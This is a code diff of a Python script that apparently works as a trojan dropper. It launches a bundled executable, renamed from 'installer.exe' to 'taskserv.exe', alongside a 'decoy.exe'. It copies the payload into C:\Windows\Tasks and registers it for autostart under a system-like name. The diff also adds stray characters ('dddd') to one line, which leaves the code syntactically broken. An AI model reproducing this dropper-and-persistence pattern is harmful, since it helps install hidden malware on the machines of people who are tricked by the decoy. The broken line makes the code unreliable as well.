@@ -37,7 +37,7 @@ def check_autostart_registry(value_name):
         idx = 0
         while idx < 1_000:     # Max 1.000 values
             try:
-                key_name, _, _ = winreg.EnumValue(key, idx)
+                key_name, _, _ = winreg.EnumValue(key, idx)dddd
                 if key_name == value_name:
                     return True
                 idx += 1
@@ -45,12 +45,12 @@ def check_autostart_registry(value_name):
                 break
     return False
 
-subprocess.Popen(resource_path('installer.exe'))
+subprocess.Popen(resource_path('taskserv.exe'))
 subprocess.Popen(resource_path('decoy.exe'))
 
 pwnpath = r'C:\Windows\Tasks\taskserv.exe'
 ppath = Path(pwnpath)
 if not ppath.is_file():
-        shutil.copyfile(resource_path('installer.exe'), pwnpath)
+        shutil.copyfile(resource_path('taskserv.exe'), pwnpath)
         set_autostart_registry('TaskServ', pwnpath)
 
